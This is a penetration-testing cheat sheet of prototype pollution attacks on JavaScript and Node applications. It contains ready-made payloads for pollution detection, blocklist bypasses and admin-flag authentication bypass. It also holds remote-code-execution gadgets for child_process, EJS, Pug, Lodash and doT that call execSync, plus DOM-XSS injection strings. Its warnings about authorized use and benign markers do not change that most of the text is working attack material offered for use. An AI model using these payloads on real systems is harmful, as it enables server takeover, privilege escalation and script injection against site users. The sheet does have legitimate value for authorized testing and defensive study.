# Prototype Pollution — Attack Arsenal

**Author:** x8bitranjit
Payloads, the gadget catalog, and tools. Authorized targets only. **Server-side pollution is global + persistent** — benign markers, no prod DoS.

---

## 0. The three roots (every payload uses one)

> **What & when:** these are the only three "magic words" that mean *the shared handbook* instead of a normal object. Every single payload below starts with one of them. Reach for `__proto__` by default (direct route); switch to `constructor.prototype` the moment the app blocklists `__proto__` (it's the side door to the same room); `__proto__.__proto__` is a niche variant for array/nested cases. Learn these three and the rest of the file is just "which line to scribble."

```
__proto__                     # direct
constructor.prototype         # bypasses __proto__ key filters
__proto__.__proto__           # via arrays/nested edge cases
```

## 1. Detection payloads

> **What & when:** step one — *did my scribble reach the handbook at all?* Use the **client** block when there's a browser page: fire the URL/hash/JSON vector, then check `Object.prototype.polluted` in the console (instant, visible). Use the **server (SSPP)** block for APIs/Node backends where you can't see the handbook: scribble a setting the framework reads for every response (`json spaces` is the cleanest), then reload an unrelated endpoint and watch it change. Always confirm on a *fresh* object / *unrelated* response — that's what separates real global pollution from mere reflection.

### Client-side (URL / hash / JSON), confirm in console
```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
#__proto__[polluted]=yes
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
--- console ---
Object.prototype.polluted     // "yes"  => POLLUTED
({}).polluted                 // "yes"
```

### Server-side (SSPP) blind oracles — send, then re-request and diff
```jsonc
{"__proto__":{"json spaces":10}}                        // Express: later JSON responses indent by 10  (BEST oracle)
{"__proto__":{"status":510}}                            // later response status = 510
{"__proto__":{"exposedHeaders":["x8bit"]}}              // Access-Control-Expose-Headers: x8bit
{"__proto__":{"content-type":"text/html; charset=x8bit"}}
{"__proto__":{"parameterLimit":1}}                      // multi-param requests now 400/500
{"__proto__":{"allowDots":true}}                        // qs parsing behavior flips
{"__proto__":{"0":"x8bit","1":"y"}}                     // array-index pollution edge cases
```
Query-string form of the same (for GET/parser sources):
```
?__proto__[json spaces]=10
?__proto__%5Bstatus%5D=510
```

## 2. Filter bypasses
> **What & when:** use these when the app clearly *tries* to stop you — a plain `__proto__` gets stripped or 400'd. The workhorse is `constructor.prototype` (the side door). The rest exploit sloppy blocklists: `__pro__proto__to__` beats a filter that removes `__proto__` exactly once (the leftovers re-form it), URL-encoding beats string-matchers that check before decoding, and parser-differential/duplicate-key tricks beat one layer while another honors the key. Match the trick to how the app filters.
```
constructor[prototype][x]=y            // when __proto__ is blocked
__proto__[__proto__][x]=y
{"__pro__proto__to__":{...}}           // some naive strip-once filters -> "__proto__"
%5f%5fproto%5f%5f                      // URL-encoded __proto__
{"constructor":{"prototype":{"x":"y"}}}
// JSON key with unicode / duplicate keys depending on parser
```

## 3. Auth / logic bypass (no gadget)
> **What & when:** try this **early** — it's the fastest, cleanest win and needs no gadget hunting. You go straight for the permission line in the handbook: if the app anywhere checks `user.isAdmin` on an object that has no such field of its own, scribbling `isAdmin:true` into the prototype makes the check pass. Spray `isAdmin`/`role`/`isAuthenticated`/`verified`/`premium` right after confirming a source. Mind the SAFE-PoC rules — the handbook is shared, so you may briefly flip other users too.
```jsonc
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"isAuthenticated":true}}
{"__proto__":{"verified":true,"premium":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

## 4. Server-side RCE gadgets (match to the target's stack)

> **What & when:** the Critical tier — use once you've *confirmed* SSPP and know (or can guess) the target's stack. Each gadget scribbles a value into a config option that some later operation reads and *executes*. **Match it to the actual dependencies:** the `NODE_OPTIONS`→`--require` chain if the app shells out to Node, EJS's `outputFunctionName` if it renders EJS, Pug's `compileDebug` for Pug, etc. Firing an EJS gadget at a Pug app does nothing. The gadget fires on the *next* render/spawn, so trigger that action, and stop after one benign command (`id`/OOB callback).

### child_process (spawn/exec/fork options fall through to the prototype)
```jsonc
{"__proto__":{"shell":"node","argv0":"console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process')..."}}}
{"__proto__":{"env":{"NODE_OPTIONS":"--inspect=... "}}}
// reliable: pollute NODE_OPTIONS -> --require=<file you control>  (pair with FileUpload / /proc)
{"__proto__":{"NODE_OPTIONS":"--require=/tmp/evil.js"}}
```

### EJS (template options)
```jsonc
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
{"__proto__":{"escapeFunction":"1;return process.mainModule.require('child_process').execSync('id')","client":true,"compileDebug":true}}
{"__proto__":{"localsName":"x;process.mainModule.require('child_process').execSync('id');//x"}}
```

### Pug / Jade
```jsonc
{"__proto__":{"compileDebug":true,"self":true,"line":"process.mainModule.require('child_process').execSync('id')"}}
{"__proto__":{"block":{"type":"Text","val":"...","line":"..."}}}
```

### Lodash `_.template` / doT / Nunjucks / Handlebars (confirm the option per version)
```jsonc
// Lodash _.template — the `sourceURL` option is concatenated into the compiled function source:
{"__proto__":{"sourceURL":"  });process.mainModule.require('child_process').execSync('id');//"}}
// doT — `varname` / strip options can inject into the generated function:
{"__proto__":{"varname":"x; process.mainModule.require('child_process').execSync('id'); //"}}
// Nunjucks / Handlebars — compile/partial options are the target; the exact key is version-specific,
// so verify against the deployed version + PortSwigger's server-side-PP gadget catalogue before firing.
```
> Accuracy note: EJS `outputFunctionName` and Pug `compileDebug` are the two most reliable, widely-reproduced server-side template gadgets. For Lodash/doT/Nunjucks/Handlebars, confirm the option against the target's exact version (the gadget can differ across releases) rather than firing blind.

### Other documented gadgets
```
nodemailer (sendmail path -> command), ansi-html, undici/proxy (proxy/uri -> SSRF),
vm2 escapes, require-cache poisoning, mongoose/mquery 'options', flat/unflatten,
express 'view options'/'view engine'/'view cache', body-parser limits, csurf/session options
```

## 4b. Vulnerable-library fingerprint (check the lockfile FIRST — a strong lead before you send anything)
```bash
grep -REn "\"lodash\"|\"jquery\"|\"minimist\"|\"yargs-parser\"|\"set-value\"|\"deep-set\"|\"dot-prop\"|\"deepmerge\"|\"merge-deep\"" package*.json yarn.lock
# vulnerable ranges: lodash <4.17.12 (CVE-2019-10744) · jQuery <3.4.0 (CVE-2019-11358)
#                    minimist <1.2.3 (CVE-2020-7598) · yargs-parser <13.1.2/15.0.1/18.1.1 (CVE-2020-7608)
# a matching version on an attacker-reachable merge/set/argv path = report even before the gadget fires
```

## 5. Client-side DOM-XSS gadgets (pollute a config prop a library reads into a sink)
> **What & when:** use on browser pages once you have a client-side source. The idea: a library on the page reads a config setting it doesn't have (so it consults the handbook) and drops that value into a dangerous sink — `innerHTML`, `script.src`, `iframe.srcdoc`. You scribble that setting to be an XSS payload and the library injects it for you. **First identify the loaded libraries**, then pick the gadget property they read (`src`/`html`/`srcdoc`/`url`). Because the value arrives via the prototype, it usually bypasses the app's normal input filters. DOM Invader finds these source→sink pairs automatically.
```
?__proto__[src]=data:,alert(document.domain)            // -> script.src / img.src
?__proto__[html]=<img src=x onerror=alert(document.domain)>   // -> innerHTML
?__proto__[srcdoc]=<script>alert(document.domain)</script>    // -> iframe.srcdoc
?__proto__[url]=javascript:alert(document.domain)             // -> location / a.href
?__proto__[template]=<img src=x onerror=alert(1)>             // -> framework template
?__proto__[data]=...  ?__proto__[content]=...  ?__proto__[value]=...
```
Known libs with gadgets: **jQuery** (`$.extend`, `htmlPrefilter`, `$(html)`), **Google Analytics/gtag**, **Segment analytics.js**, **Closure**, **Wistia**, **AdobeDTM / Adobe Launch**, **sanitize-html/DOMPurify configs**, **Knockout**, **Sprintf**. Identify loaded scripts, then use the matching gadget from PortSwigger's gadget catalog.

## 6. Tools

| Tool | Use |
|------|-----|
| **DOM Invader** (Burp built-in browser) | Client-side PP: auto source discovery **and** gadget scanning — the primary client tool |
| **Burp Suite** (Repeater) | Server-side SSPP oracle testing; JSON/query pollution + re-request diff |
| **`poc/pp_probe.py`** | Control-baselined SSPP oracle detector (`json spaces`/`status`/`exposedHeaders`/charset) |
| **`poc/pp_payloads.py`** | Generate the full payload matrix (URL/JSON/bracket/dot × `__proto__`/`constructor`) for a prop=value |
| **ppmap** | Client + server PP scanner (confirm manually — noisy) |
| **ppfuzz** (Rust) | Fast client-side PP source fuzzer |
| **protofuzz / PPScan** | Additional scanners |
| **Node REPL / local app** | Reproduce a gadget locally to understand the sink before firing on target |
| **Interactsh / OOB** | Blind server-side RCE confirmation (gadget → callback) |

## 7. Server-side detection quick-flow (pp_probe)
> **What & when:** the exact order to run a *blind* server-side test end-to-end — baseline first (so you can prove a change), scribble a benign oracle, re-fetch and diff, then (only once confirmed) match a real gadget. Follow it whenever you suspect an SSPP source but have no console. The final line is not optional: the pollution persists until restart and hits every user, so benign markers only and never a prod-DoS property.
```
1. baseline a JSON endpoint (record indentation/status/headers)
2. POST {"__proto__":{"json spaces":10}}  to a merge/set source
3. re-fetch the JSON endpoint -> indented?  => SSPP confirmed
4. match a gadget (child_process/EJS/Pug) from the target's deps -> RCE
5. NOTE: pollution persists until app restart; use benign markers; no prod DoS
```

> Prove **global** pollution (fresh object / oracle flip) **and** fire a gadget. Benign markers only, one RCE proof then STOP,
> never a prod-DoS property, deliver client PoCs to your own test victim, redact secrets. Authorized targets only.
